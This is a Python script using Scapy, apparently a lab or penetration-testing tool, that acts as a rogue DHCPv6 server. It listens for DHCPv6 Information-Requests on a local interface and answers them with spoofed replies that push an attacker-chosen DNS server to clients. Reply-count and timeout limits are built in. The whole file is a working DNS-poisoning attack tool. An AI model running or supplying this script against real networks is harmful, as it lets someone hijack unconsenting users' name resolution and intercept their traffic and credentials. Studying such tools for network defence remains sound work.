
#!/usr/bin/env python3

import argparse
import ipaddress

from scapy.all import (
    Ether,
    IPv6,
    UDP,
    get_if_hwaddr,
    sniff,
    sendp
)

from scapy.layers.dhcp6 import (
    DHCP6_InfoRequest,
    DHCP6_Reply,
    DHCP6OptClientId,
    DHCP6OptServerId,
    DHCP6OptDNSServers,
    DUID_LL
)


def main():
    parser = argparse.ArgumentParser(
        description="Controlled rogue DHCPv6 stateless server"
    )

    parser.add_argument("--iface", required=True)
    parser.add_argument("--attacker-ip", default="fe80::66")
    parser.add_argument("--attacker-mac", default=None)
    parser.add_argument(
        "--dns-server",
        default="2001:db8:bad::53"
    )
    parser.add_argument("--timeout", type=int, default=60)
    parser.add_argument("--max-replies", type=int, default=20)

    args = parser.parse_args()

    try:
        server_ip = ipaddress.IPv6Address(args.attacker_ip)
        dns_ip = ipaddress.IPv6Address(args.dns_server)
    except ValueError as exc:
        parser.error(str(exc))

    if not server_ip.is_link_local:
        parser.error("--attacker-ip must be link-local")

    if not 1 <= args.max_replies <= 50:
        parser.error("--max-replies must be between 1 and 50")

    if args.timeout < 1 or args.timeout > 300:
        parser.error("--timeout must be between 1 and 300 seconds")

    attacker_mac = args.attacker_mac or get_if_hwaddr(args.iface)

    replies_sent = 0

    def handle_request(pkt):
        nonlocal replies_sent

        if replies_sent >= args.max_replies:
            return

        if not pkt.haslayer(DHCP6_InfoRequest):
            return

        if not pkt.haslayer(IPv6) or not pkt.haslayer(Ether):
            return

        client_ip = pkt[IPv6].src

        if client_ip == "::":
            return

        client_id = pkt.getlayer(DHCP6OptClientId)

        if client_id is None:
            print("Ignoring Information-Request without Client ID")
            return

        reply = (
            Ether(
                src=attacker_mac,
                dst=pkt[Ether].src
            )
            /
            IPv6(
                src=str(server_ip),
                dst=client_ip,
                hlim=1
            )
            /
            UDP(
                sport=547,
                dport=546
            )
            /
            DHCP6_Reply(
                trid=pkt[DHCP6_InfoRequest].trid
            )
            /
            DHCP6OptServerId(
                duid=DUID_LL(lladdr=attacker_mac)
            )
            /
            DHCP6OptClientId(
                duid=client_id.duid
            )
            /
            DHCP6OptDNSServers(
                dnsservers=[str(dns_ip)]
            )
        )

        sendp(
            reply,
            iface=args.iface,
            verbose=False
        )

        replies_sent += 1

        print(
            f"[{replies_sent}] Rogue DHCPv6 Reply sent "
            f"to {client_ip}, DNS={dns_ip}"
        )

    print(f"Listening on {args.iface}")
    print(f"Advertised DNS: {dns_ip}")
    print(f"Maximum replies: {args.max_replies}")

    try:
        sniff(
            iface=args.iface,
            filter="udp and dst port 547",
            prn=handle_request,
            store=False,
            timeout=args.timeout
        )
    except KeyboardInterrupt:
        print("Interrupted.")

    print(f"Total replies sent: {replies_sent}")


if __name__ == "__main__":
    main()
